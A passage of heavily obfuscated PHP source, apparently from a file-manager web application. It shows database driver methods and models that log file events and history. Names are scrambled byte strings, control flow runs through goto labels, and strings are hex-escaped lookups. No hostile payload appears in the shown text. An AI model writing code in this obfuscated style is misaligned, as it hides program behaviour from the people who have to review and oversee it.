$bŠ…œˆ‘’ë[33] || isset($Aö²±Çò×[$bŠ…œˆ‘’ë[31]]) && $Aö²±Çò×[$bŠ…œˆ‘’ë[31]] === $bŠ…œˆ‘’ë[33]), $bŠ…œˆ‘’ë[34] => isset($Aö²±Çò×[$bŠ…œˆ‘’ë[34]]) ? $Aö²±Çò×[$bŠ…œˆ‘’ë[34]] : (isset($Aö²±Çò×[$bŠ…œˆ‘’ë[53]]) ? $Aö²±Çò×[$bŠ…œˆ‘’ë[53]] : $bŠ…œˆ‘’ë[361]), $bŠ…œˆ‘’ë[36] => isset($Aö²±Çò×[$bŠ…œˆ‘’ë[89]]) ? strtolower($Aö²±Çò×[$bŠ…œˆ‘’ë[89]]) == $bŠ…œˆ‘’ë[38] : (isset($Aö²±Çò×[$bŠ…œˆ‘’ë[54]]) ? $Aö²±Çò×[$bŠ…œˆ‘’ë[54]] : !1), $bŠ…œˆ‘’ë[39] => isset($Aö²±Çò×[$bŠ…œˆ‘’ë[857]]) ? strtolower($Aö²±Çò×[$bŠ…œˆ‘’ë[857]]) == $bŠ…œˆ‘’ë[41] : (isset($Aö²±Çò×[$bŠ…œˆ‘’ë[89]]) ? $Aö²±Çò×[$bŠ…œˆ‘’ë[89]] : !1)); } } goto fõßçÇåéÃ; fõßçÇåéÃ: return $f“êË¨™ô‡; goto bÏô’°ù®ˆ; dö¬ÖÜ‚‚ó: $bŠ…œˆ‘’ë =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->initConnect(!0); if (think_config($bŠ…œˆ‘’ë[841])) { $C†Ôœ·Ğ›Ñ = str_replace($bŠ…œˆ‘’ë[842], $bÏ¸ºˆò™, think_config($bŠ…œˆ‘’ë[841])); } else { switch ($this->dbType) { case $bŠ…œˆ‘’ë[825]: case $bŠ…œˆ‘’ë[843]: $C†Ôœ·Ğ›Ñ = "\123\x45\x4c\x45\103\124\x20\40\40\143\157\154\x75\x6d\156\x5f\x6e\141\155\x65\x20\x61\163\x20\47\x4e\141\x6d\x65\x27\x2c\40\40\x20\x64\141\x74\141\x5f\164\x79\x70\145\40\x61\163\x20\47\124\171\160\145\47\54\x20\x20\40\143\x6f\x6c\165\x6d\x6e\137\144\x65\x66\x61\165\x6c\x74\x20\x61\x73\40\x27\104\145\146\141\165\x6c\x74\x27\x2c\x20\x20\40\x69\x73\137\x6e\165\154\154\x61\x62\x6c\x65\x20\x61\x73\x20\x27\116\165\x6c\x6c\47\xa\x9\x9\x46\x52\x4f\115\x9\x69\156\146\157\x72\x6d\x61\164\x69\x6f\156\137\163\143\x68\145\x6d\141\56\x74\141\142\154\x65\x73\x20\101\x53\40\x74\xa\11\11\112\x4f\111\116\x9\151\156\x66\157\162\155\141\164\x69\157\156\137\163\x63\x68\145\155\x61\x2e\x63\157\x6c\x75\155\x6e\163\40\x41\123\x20\x63\12\11\x9\x4f\116\x20\x20\x74\x2e\x74\x61\142\154\145\137\143\141\x74\x61\154\157\147\40\x3d\x20\x63\x2e\164\141\142\x6c\x65\x5f\143\x61\x74\x61\154\x6f\147\12\11\11\x41\x4e\104\x20\x74\x2e\x74\141\142\x6c\145\137\x73\143\x68\x65\x6d\141\x20\75\40\x63\x2e\164\141\142\x6c\145\137\x73\x63\150\145\155\x61\12\11\11\101\116\x44\40\164\x2e\164\x61\x62\x6c\x65\137\x6e\141\155\x65\x20\75\x20\x63\x2e\164\141\x62\x6c\x65\x5f\x6e\141\155\145\xa\x9\11\x57\x48\x45\122\105\x20\40\40\164\56\164\x61\142\154\145\x5f\156\141\x6d\145\40\x3d\x20\x27{$bÏ¸ºˆò™}\x27"; break; case $bŠ…œˆ‘’ë[844]: $C†Ôœ·Ğ›Ñ = $bŠ…œˆ‘’ë[845] . $bÏ¸ºˆò™ . $bŠ…œˆ‘’ë[846]; break; case $bŠ…œˆ‘’ë[826]: case $bŠ…œˆ‘’ë[828]: $C†Ôœ·Ğ›Ñ = $bŠ…œˆ‘’ë[847] . $bŠ…œˆ‘’ë[848] . $bŠ…œˆ‘’ë[849] . strtoupper($bÏ¸ºˆò™) . $bŠ…œˆ‘’ë[850] . strtoupper($bÏ¸ºˆò™) . $bŠ…œˆ‘’ë[851]; break; case $bŠ…œˆ‘’ë[852]: $C†Ôœ·Ğ›Ñ = $bŠ…œˆ‘’ë[853] . $bÏ¸ºˆò™ . $bŠ…œˆ‘’ë[854]; break; case $bŠ…œˆ‘’ë[827]: break; case $bŠ…œˆ‘’ë[855]: default: $C†Ôœ·Ğ›Ñ = $bŠ…œˆ‘’ë[856] . ($this->dbType == $bŠ…œˆ‘’ë[855] ? "\x60{$bÏ¸ºˆò™}\140" : $bÏ¸ºˆò™); } } goto A´ª´éã; bÏô’°ù®ˆ: } public function getTables($DÁÉ¦‡ßÆŒ = '') { $b²ˆ²âğ¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (think_config($b²ˆ²âğ¥[858])) { $F¾”¥ĞÄ±‹ = str_replace($b²ˆ²âğ¥[859], $DÁÉ¦‡ßÆŒ, think_config($b²ˆ²âğ¥[858])); } else { switch ($this->dbType) { case $b²ˆ²âğ¥[826]: case $b²ˆ²âğ¥[828]: $F¾”¥ĞÄ±‹ = $b²ˆ²âğ¥[860]; break; case $b²ˆ²âğ¥[825]: case $b²ˆ²âğ¥[843]: $F¾”¥ĞÄ±‹ = $b²ˆ²âğ¥[861]; break; case $b²ˆ²âğ¥[852]: $F¾”¥ĞÄ±‹ = $b²ˆ²âğ¥[862]; break; case $b²ˆ²âğ¥[827]: think_exception(think_lang($b²ˆ²âğ¥[863]) . $b²ˆ²âğ¥[864]); break; case $b²ˆ²âğ¥[844]: $F¾”¥ĞÄ±‹ = $b²ˆ²âğ¥[42] . $b²ˆ²âğ¥[43] . $b²ˆ²âğ¥[44]; break; case $b²ˆ²âğ¥[855]: default: if (!empty($DÁÉ¦‡ßÆŒ)) { $F¾”¥ĞÄ±‹ = $b²ˆ²âğ¥[808] . $DÁÉ¦‡ßÆŒ; } else { $F¾”¥ĞÄ±‹ = $b²ˆ²âğ¥[809]; } } } $BƒÒ‘¹óôÃ = $this->query($F¾”¥ĞÄ±‹); $e˜ÁÚ×ñ = array(); foreach ($BƒÒ‘¹óôÃ as $døÖ½ãà§ => $Bæë©¿©è—) { $e˜ÁÚ×ñ[$døÖ½ãà§] = current($Bæë©¿©è—); } return $e˜ÁÚ×ñ; } protected function parseLimit($d¡Ûà±ˆ•æ) { $fˆÀí™¸Ïê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Fî°÷’æ“œ = $fˆÀí™¸Ïê[33]; if (!empty($d¡Ûà±ˆ•æ)) { switch ($this->dbType) { case $fˆÀí™¸Ïê[852]: case $fˆÀí™¸Ïê[844]: $d¡Ûà±ˆ•æ = explode($fˆÀí™¸Ïê[47], $d¡Ûà±ˆ•æ); if (count($d¡Ûà±ˆ•æ) > 1) { $Fî°÷’æ“œ .= $fˆÀí™¸Ïê[48] . $d¡Ûà±ˆ•æ[1] . $fˆÀí™¸Ïê[49] . $d¡Ûà±ˆ•æ[0] . $fˆÀí™¸Ïê[50]; } else { $Fî°÷’æ“œ .= $fˆÀí™¸Ïê[48] . $d¡Ûà±ˆ•æ[0] . $fˆÀí™¸Ïê[50]; } break; case $fˆÀí™¸Ïê[825]: case $fˆÀí™¸Ïê[843]: break; case $fˆÀí™¸Ïê[827]: break; case $fˆÀí™¸Ïê[826]: case $fˆÀí™¸Ïê[828]: break; case $fˆÀí™¸Ïê[855]: default: $Fî°÷’æ“œ .= $fˆÀí™¸Ïê[48] . $d¡Ûà±ˆ•æ . $fˆÀí™¸Ïê[50]; } } return $Fî°÷’æ“œ; } public function parseKey(&$f¤ÊÄÜğ», $bğ‹ØÑ—£ù = true) { $b¹‘‡¾—¯å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($bğ‹ØÑ—£ù) { $f¤ÊÄÜğ» = $this->parseKeyCheck($f¤ÊÄÜğ»); } if ($this->dbType == $b¹‘‡¾—¯å[855]) { if ($f¤ÊÄÜğ» != $b¹‘‡¾—¯å[176] && !preg_match($b¹‘‡¾—¯å[819], $f¤ÊÄÜğ»)) { $f¤ÊÄÜğ» = $b¹‘‡¾—¯å[820] . trim($f¤ÊÄÜğ», $b¹‘‡¾—¯å[820]) . $b¹‘‡¾—¯å[820]; } return $f¤ÊÄÜğ»; } else { return parent::parseKey($f¤ÊÄÜğ»); } } public function close() { $this->_linkID = null; } public function error() { $Fæ¦¶êÉª =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->PDOStatement) { $F˜Ì˜¤„Ùà = $this->PDOStatement->errorInfo(); $this->error = $F˜Ì˜¤„Ùà[1] . $Fæ¦¶êÉª[4] . $F˜Ì˜¤„Ùà[2]; } else { $this->error = $Fæ¦¶êÉª[33]; } if ($Fæ¦¶êÉª[33] != $this->queryStr) { $this->error .= LNG($Fæ¦¶êÉª[45]) . $this->queryStr; } think_trace($this->error, $Fæ¦¶êÉª[33], $Fæ¦¶êÉª[46]); return $this->error; } public function escapeString($c²î¸‚÷•ƒ) { $a¦›å†®è½ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; switch ($this->dbType) { case $a¦›å†®è½[852]: case $a¦›å†®è½[825]: case $a¦›å†®è½[843]: case $a¦›å†®è½[855]: return addslashes($c²î¸‚÷•ƒ); case $a¦›å†®è½[827]: case $a¦›å†®è½[844]: case $a¦›å†®è½[826]: case $a¦›å†®è½[828]: return str_ireplace($a¦›å†®è½[55], $a¦›å†®è½[56], $c²î¸‚÷•ƒ); } } protected function parseValue($B™ÓÄ‰º‰Ê) { $D½šö²Æï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_string($B™ÓÄ‰º‰Ê)) { $B™ÓÄ‰º‰Ê = strpos($B™ÓÄ‰º‰Ê, $D½šö²Æï[4]) === 0 ? $this->escapeString($B™ÓÄ‰º‰Ê) : $D½šö²Æï[865] . $this->escapeString($B™ÓÄ‰º‰Ê) . $D½šö²Æï[865]; } elseif (isset($B™ÓÄ‰º‰Ê[0]) && is_string($B™ÓÄ‰º‰Ê[0]) && strtolower($B™ÓÄ‰º‰Ê[0]) == $D½šö²Æï[285]) { $B™ÓÄ‰º‰Ê = $this->escapeString($B™ÓÄ‰º‰Ê[1]); } elseif (is_array($B™ÓÄ‰º‰Ê)) { $B™ÓÄ‰º‰Ê = array_map(array($this, $D½šö²Æï[866]), $B™ÓÄ‰º‰Ê); } elseif (is_bool($B™ÓÄ‰º‰Ê)) { $B™ÓÄ‰º‰Ê = $B™ÓÄ‰º‰Ê ? $D½šö²Æï[83] : $D½šö²Æï[470]; } elseif (is_null($B™ÓÄ‰º‰Ê)) { $B™ÓÄ‰º‰Ê = $D½šö²Æï[99]; } return $B™ÓÄ‰º‰Ê; } public function getLastInsertId() { $fñ¯…ÃÁË =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; switch ($this->dbType) { case $fñ¯…ÃÁË[852]: case $fñ¯…ÃÁË[844]: case $fñ¯…ÃÁË[825]: case $fñ¯…ÃÁË[843]: case $fñ¯…ÃÁË[827]: case $fñ¯…ÃÁË[855]: return $this->_linkID->lastInsertId(); case $fñ¯…ÃÁË[826]: case $fñ¯…ÃÁË[828]: $bªŞ§Ìİá£ = $this->table; $FÛ©«Ë†™ = $this->query("\123\x45\x4c\x45\x43\124\x20{$bªŞ§Ìİá£}\56\143\x75\162\x72\166\x61\x6c\x20\x63\x75\x72\162\166\x61\154\x20\x46\x52\117\115\x20\x64\165\x61\154"); return $FÛ©«Ë†™ ? $FÛ©«Ë†™[0][$fñ¯…ÃÁË[867]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($a¹èçöŒ) { goto aÀê®æÑ›Á; cÑã®„ç¯â: if (!$dŠÊËÚ÷Æ”) { return !1; } if (flock($dŠÊËÚ÷Æ”, LOCK_EX)) { $aê»•Êâ = parent::query($a¹èçöŒ); flock($dŠÊËÚ÷Æ”, LOCK_UN); fclose($dŠÊËÚ÷Æ”); return $aê»•Êâ; } flock($dŠÊËÚ÷Æ”, LOCK_UN); goto E·–‹‡•ì®; E·–‹‡•ì®: fclose($dŠÊËÚ÷Æ”); show_json($FâƒÉ»à®[870], !1); return !1; goto BŞø‘Œï´Ú; aÀê®æÑ›Á: $FâƒÉ»à® =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Fö†á²âÒ = DATA_PATH . $FâƒÉ»à®[868]; $dŠÊËÚ÷Æ” = fopen($Fö†á²âÒ, $FâƒÉ»à®[869]); goto cÑã®„ç¯â; BŞø‘Œï´Ú: } public function execute($E¼Äé™ğÖ) { goto DÆ“ÀÅù…Ê; c±®ù‹Üëë: if (!$Eóß©Ü«Û) { return !1; } if (flock($Eóß©Ü«Û, LOCK_EX)) { $eÌòÜî°–³ = parent::execute($E¼Äé™ğÖ); flock($Eóß©Ü«Û, LOCK_UN); fclose($Eóß©Ü«Û); return $eÌòÜî°–³; } flock($Eóß©Ü«Û, LOCK_UN); goto CÀ½í‡ÍÂ¹; DÆ“ÀÅù…Ê: $fˆÛóÙ¤”¬ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fšëŒÆ×ŒÚ = DATA_PATH . $fˆÛóÙ¤”¬[868]; $Eóß©Ü«Û = fopen($fšëŒÆ×ŒÚ, $fˆÛóÙ¤”¬[869]); goto c±®ù‹Üëë; CÀ½í‡ÍÂ¹: fclose($Eóß©Ü«Û); show_json($fˆÛóÙ¤”¬[870], !1); return !1; goto aŸĞôÕ°â•; aŸĞôÕ°â•: } } goto fääÅ‡×¶; D±‹¹Óƒ±: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\x72\x63\x65\137\145\166\145\x6e\164"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\145\x54\x69\x6d\x65", "\164\x69\x6d\145", "\151\156\163\145\162\x74", "\x66\x75\156\143\x74\151\x6f\x6e"), array("\x64\145\x73\x63", '', "\151\156\x73\145\162\x74\x2c\165\160\x64\141\x74\145\54\163\145\154\145\143\164", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($c©©ŸÎÏ, $fïØ¢—»¾Ã, $Dõ§Û™äË = '') { goto aøÚˆç·ƒÉ; a‰ğ© ÒŞÁ: if (!$E¬¸ƒßÜ¿) { return !1; } if ($this->isCacheEvent($E¬¸ƒßÜ¿, $fïØ¢—»¾Ã)) { return; } if ($Dõ§Û™äË && is_string($Dõ§Û™äË)) { $Dõ§Û™äË = array($c Âƒ·Å[2139] => $Dõ§Û™äË); } goto DÌÂÑÊÇ¤‹; DÌÂÑÊÇ¤‹: $f¡ŸÙµÉŞ¦ = array($c Âƒ·Å[383] => $c©©ŸÎÏ, $c Âƒ·Å[2311] => $E¬¸ƒßÜ¿[$c Âƒ·Å[463]], $c Âƒ·Å[2312] => $E¬¸ƒßÜ¿[$c Âƒ·Å[28]], $c Âƒ·Å[468] => $E¬¸ƒßÜ¿[$c Âƒ·Å[468]], $c Âƒ·Å[1428] => USER_ID, $c Âƒ·Å[388] => $fïØ¢—»¾Ã, $c Âƒ·Å[1430] => $Dõ§Û™äË); $this->addSystemLog($fïØ¢—»¾Ã, $f¡ŸÙµÉŞ¦); return $this->add($f¡ŸÙµÉŞ¦); goto CğÃ¿Ì­¡; aøÚˆç·ƒÉ: $c Âƒ·Å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$this->eventSave) { return; } $E¬¸ƒßÜ¿ = Model($c Âƒ·Å[1114])->sourceInfo($c©©ŸÎÏ); goto a‰ğ© ÒŞÁ; CğÃ¿Ì­¡: } private function addSystemLog($Bõ£¶Ææ¸±, $b±óÌåÁÜ) { $AĞäá°´…Ş =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($Bõ£¶Ææ¸± == $AĞäá°´…Ş[2313]) { $Bõ£¶Ææ¸± = $b±óÌåÁÜ[$AĞäá°´…Ş[405]][$AĞäá°´…Ş[2314]]; } else { if (in_array($Bõ£¶Ææ¸±, array($AĞäá°´…Ş[2085], $AĞäá°´…Ş[2315]))) { $Bõ£¶Ææ¸± = $b±óÌåÁÜ[$AĞäá°´…Ş[405]][$AĞäá°´…Ş[686]]; } } $b‡±çÚÇ´á = array_merge($b±óÌåÁÜ, array($AĞäá°´…Ş[2316] => $b±óÌåÁÜ[$AĞäá°´…Ş[369]], $AĞäá°´…Ş[2317] => $b±óÌåÁÜ[$AĞäá°´…Ş[2317]])); Model($AĞäá°´…Ş[2048])->addLog($AĞäá°´…Ş[2318] . $Bõ£¶Ææ¸±, $b‡±çÚÇ´á); } private function isCacheEvent($fÜÑŸÒñ“§, $eÕ†î’“¸’) { if ($fÜÑŸÒñ“§[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($b§ö¯«åÊ‘, $eÕ¾‰öÆ¥Å) { $b¸î²–Óİ™ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BŞÔ‘¼ƒô£ = Model($b¸î²–Óİ™[1114])->sourceInfo($b§ö¯«åÊ‘); $cÀÁ‰æÄÔØ = array($b¸î²–Óİ™[2314] => $eÕ¾‰öÆ¥Å, $b¸î²–Óİ™[28] => $BŞÔ‘¼ƒô£[$b¸î²–Óİ™[28]]); return $this->addEvent($b§ö¯«åÊ‘, $b¸î²–Óİ™[2313], $cÀÁ‰æÄÔØ); } public function eventFileEdit($c•èÔ™Û©) { $FÆ¸åß÷Ó‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b•­ƒ¶·ÛÎ = array($FÆ¸åß÷Ó‘[2319] => $_SERVER[$FÆ¸åß÷Ó‘[2320]], $FÆ¸åß÷Ó‘[1752] => strtolower(ACTION)); return $this->addEvent($c•èÔ™Û©, $FÆ¸åß÷Ó‘[2075], $b•­ƒ¶·ÛÎ); } public function eventRecycle($DöÆ’í±ö…, $aà£ì¿µŠ) { return $this->addEvent($DöÆ’í±ö…, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2315], $aà£ì¿µŠ); } public function eventRemove($cºÃ“¨‹‡ó) { $a—Éğò—Î¦ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E¥™ŞÛ‚œÏ = Model($a—Éğò—Î¦[1114])->sourceInfo($cºÃ“¨‹‡ó); $dˆïªÚğ‹ = $E¥™ŞÛ‚œÏ[$a—Éğò—Î¦[28]]; return $this->addEvent($E¥™ŞÛ‚œÏ[$a—Éğò—Î¦[463]], $a—Éğò—Î¦[2074], $dˆïªÚğ‹); } public function eventShare($cè¿…Àóë¦, $eË²¬©æ­È) { return $this->addEvent($cè¿…Àóë¦, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2085], $eË²¬©æ­È); } public function eventMove($Báß«Ì–»°, $Cï¬Œøí°µ, $FÁÙÙ¸ËÂ) { goto C˜‡õ¥ª; FÓØ›ÂÎ‡õ: $CÏ÷ó¬ŸÙ = $BÜá‚¾à³‰->sourceInfo($Cï¬Œøí°µ); $dÇ²¨™©¼Û = $BÜá‚¾à³‰->sourceInfo($FÁÙÙ¸ËÂ); $b¥À¥¤ğÔ£ = array($aÜ¦‰Àõ¦Ú[1004] => $Cï¬Œøí°µ, $aÜ¦‰Àõ¦Ú[2321] => $CÏ÷ó¬ŸÙ[$aÜ¦‰Àõ¦Ú[28]], $aÜ¦‰Àõ¦Ú[2322] => $CÏ÷ó¬ŸÙ[$aÜ¦‰Àõ¦Ú[468]], $aÜ¦‰Àõ¦Ú[1005] => $FÁÙÙ¸ËÂ, $aÜ¦‰Àõ¦Ú[2323] => $dÇ²¨™©¼Û[$aÜ¦‰Àõ¦Ú[28]], $aÜ¦‰Àõ¦Ú[2324] => $dÇ²¨™©¼Û[$aÜ¦‰Àõ¦Ú[468]]); goto E¹—º¨¸»¨; E¹—º¨¸»¨: $this->addEvent($Báß«Ì–»°, $aÜ¦‰Àõ¦Ú[494], $b¥À¥¤ğÔ£); $f»ª‘‚„ = $BÜá‚¾à³‰->sourceInfo($Báß«Ì–»°); $b¥À¥¤ğÔ£ = array($aÜ¦‰Àõ¦Ú[369] => $f»ª‘‚„[$aÜ¦‰Àõ¦Ú[369]], $aÜ¦‰Àõ¦Ú[28] => $f»ª‘‚„[$aÜ¦‰Àõ¦Ú[28]]); goto CôåìÛ†Øô; C˜‡õ¥ª: $aÜ¦‰Àõ¦Ú =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BÜá‚¾à³‰ = Model($aÜ¦‰Àõ¦Ú[1114]); $f»ª‘‚„ = $BÜá‚¾à³‰->sourceInfo($Báß«Ì–»°); goto FÓØ›ÂÎ‡õ; CôåìÛ†Øô: $this->addEvent($Cï¬Œøí°µ, $aÜ¦‰Àõ¦Ú[2325], $b¥À¥¤ğÔ£); goto dî±Šğ·à ; dî±Šğ·à : } public function eventCopy($Bà‚ĞÔÆ) { $this->eventCreate($Bà‚ĞÔÆ, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][492]); } public function eventRename($Bß«‚Šš²Ö, $DÉéà²İ», $d …¯å±‡Ë) { $D®†°¬à =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d¯àÅª–™’ = array($D®†°¬à[1004] => $DÉéà²İ», $D®†°¬à[1005] => $d …¯å±‡Ë); return $this->addEvent($Bß«‚Šš²Ö, $D®†°¬à[1129], $d¯àÅª–™’); } public function eventAddComment($b—À§œ°Œ, $EÄÎãÃØ¶) { return $this->addEvent($b—À§œ°Œ, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2326], $EÄÎãÃØ¶); } public function eventAddDesc($cå„Ñ¯ÔŒ¦, $dôâÂâïŒ) { return $this->addEvent($cå„Ñ¯ÔŒ¦, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2327], $dôâÂâïŒ); } public function listBySource($cÃéÉôª£) { goto aåˆ¼ÃÖ”Ñ; EÀöÑñîï: if ($bİËÏí®†Ï[$c¯İ¸Ñ‹¶[370]] == $c¯İ¸Ñ‹¶[83]) { $a†É»ÑÇ = Model($c¯İ¸Ñ‹¶[1114])->listSearchChildren($cÃéÉôª£, 20000); $a†É»ÑÇ[] = $cÃéÉôª£ . $c¯İ¸Ñ‹¶[361]; $Dá†³Üœ‹¢ = array($c¯İ¸Ñ‹¶[369] => array($c¯İ¸Ñ‹¶[7], $a†É»ÑÇ)); } $bšôßİËÅÒ = $this->where($Dá†³Üœ‹¢)->order($c¯İ¸Ñ‹¶[2328])->selectPage(); if ($bšôßİËÅÒ[$c¯İ¸Ñ‹¶[351]][$c¯İ¸Ñ‹¶[352]] == 0) { $bšôßİËÅÒ[$c¯İ¸Ñ‹¶[351]][$c¯İ¸Ñ‹¶[352]] = 1; $bšôßİËÅÒ[$c¯İ¸Ñ‹¶[354]] = array(array($c¯İ¸Ñ‹¶[383] => $cÃéÉôª£, $c¯İ¸Ñ‹¶[2311] => $bİËÏí®†Ï[$c¯İ¸Ñ‹¶[463]], $c¯İ¸Ñ‹¶[1428] => $bİËÏí®†Ï[$c¯İ¸Ñ‹¶[378]], $c¯İ¸Ñ‹¶[388] => $c¯İ¸Ñ‹¶[2329], $c¯İ¸Ñ‹¶[389] => $bİËÏí®†Ï[$c¯İ¸Ñ‹¶[187]], $c¯İ¸Ñ‹¶[1430] => $c¯İ¸Ñ‹¶[33])); } goto FàÒ——¥à; FàÒ——¥à: return $this->eventListParse($bšôßİËÅÒ, $cÃéÉôª£); goto A‘•¢¥ùÀ¨; aåˆ¼ÃÖ”Ñ: $c¯İ¸Ñ‹¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bİËÏí®†Ï = Model($c¯İ¸Ñ‹¶[1114])->sourceInfo($cÃéÉôª£); $Dá†³Üœ‹¢ = array($c¯İ¸Ñ‹¶[383] => $cÃéÉôª£); goto EÀöÑñîï; A‘•¢¥ùÀ¨: } private function eventListParse($d¶ÔÃ÷È—, $EµèÄÊ‰Ô) { goto CÏ„˜ç“‘•; AñÙ®‡í®ä: $E›—™Â¶ÏÍ = array_unique($E›—™Â¶ÏÍ); $EîøÛ›†» = array_unique(array_to_keyvalue($EË£ºá¹…ä, $DÓ±³Íâµ¦[33], $DÓ±³Íâµ¦[1437])); $e­£„Šñ = Model($DÓ±³Íâµ¦[479])->userListInfo($EîøÛ›†»); goto eÓ»Åã¾–é; BÒË†„àñ: $fùæ±Â½“ˆ = array_to_keyvalue($EË£ºá¹…ä, $DÓ±³Íâµ¦[33], $DÓ±³Íâµ¦[2317]); foreach ($EË£ºá¹…ä as $DŸ§Ñ“ñµ) { $f†ï‹ˆò‚Ğ = $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[405]]; if ($DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[29]] == $DÓ±³Íâµ¦[494] && isset($f†ï‹ˆò‚Ğ[$DÓ±³Íâµ¦[1004]])) { $E›—™Â¶ÏÍ[] = $f†ï‹ˆò‚Ğ[$DÓ±³Íâµ¦[1004]] . $DÓ±³Íâµ¦[33]; $E›—™Â¶ÏÍ[] = $f†ï‹ˆò‚Ğ[$DÓ±³Íâµ¦[1005]] . $DÓ±³Íâµ¦[33]; } if ($DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[29]] == $DÓ±³Íâµ¦[2325] && isset($f†ï‹ˆò‚Ğ[$DÓ±³Íâµ¦[369]])) { $E›—™Â¶ÏÍ[] = $f†ï‹ˆò‚Ğ[$DÓ±³Íâµ¦[369]] . $DÓ±³Íâµ¦[33]; } } $E›—™Â¶ÏÍ = array_merge($E›—™Â¶ÏÍ, $fùæ±Â½“ˆ, array($EµèÄÊ‰Ô . $DÓ±³Íâµ¦[33])); goto AñÙ®‡í®ä; C²ßîªˆÊ: $d¶ÔÃ÷È—[$DÓ±³Íâµ¦[354]] = $EË£ºá¹…ä; return $d¶ÔÃ÷È—; goto eì¦Ë©À™Ë; eÓ»Åã¾–é: $eöµÏî‹œ§ = Model($DÓ±³Íâµ¦[754])->sourceListInfo($E›—™Â¶ÏÍ, !0); foreach ($EË£ºá¹…ä as &$DŸ§Ñ“ñµ) { if ($DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[29]] == $DÓ±³Íâµ¦[494] && isset($DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[405]][$DÓ±³Íâµ¦[1004]])) { $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[405]][$DÓ±³Íâµ¦[1004]] = $eöµÏî‹œ§[$DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[405]][$DÓ±³Íâµ¦[1004]]]; $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[405]][$DÓ±³Íâµ¦[1005]] = $eöµÏî‹œ§[$DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[405]][$DÓ±³Íâµ¦[1005]]]; } if ($DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[29]] == $DÓ±³Íâµ¦[2325] && isset($DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[405]][$DÓ±³Íâµ¦[369]])) { $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[405]][$DÓ±³Íâµ¦[369]] = $eöµÏî‹œ§[$DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[405]][$DÓ±³Íâµ¦[369]]]; } $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[391]] = $eöµÏî‹œ§[$DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[369]]]; $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[2330]] = $eöµÏî‹œ§[$DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[2317]]]; if ($DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[29]] == $DÓ±³Íâµ¦[2074]) { $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[2330]] = $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[391]]; $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[2317]] = $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[2330]][$DÓ±³Íâµ¦[369]]; $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[391]] = !1; $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[369]] = $DÓ±³Íâµ¦[33]; } $DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[2261]] = $e­£„Šñ[$DŸ§Ñ“ñµ[$DÓ±³Íâµ¦[1437]]]; } unset($DŸ§Ñ“ñµ); goto C²ßîªˆÊ; CÏ„˜ç“‘•: $DÓ±³Íâµ¦ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EË£ºá¹…ä = $d¶ÔÃ÷È—[$DÓ±³Íâµ¦[354]]; $E›—™Â¶ÏÍ = array_to_keyvalue($EË£ºá¹…ä, $DÓ±³Íâµ¦[33], $DÓ±³Íâµ¦[369]); goto BÒË†„àñ; eì¦Ë©À™Ë: } public function removeBySource($C¤Ñ®Ü‡ˆ) { $fÆğƒëà® = array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][383] => $C¤Ñ®Ü‡ˆ); $this->where($fÆğƒëà®)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\x63\145\x5f\x68\x69\x73\164\x6f\x72\171"; public function addHistory($dÖ¦Ôğ¥å, $f°‚¤Ó‡‘ò = '') { $aØ¸­Ğ¨›ß =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¯’¡¥¼ = array($aØ¸­Ğ¨›ß[383] => 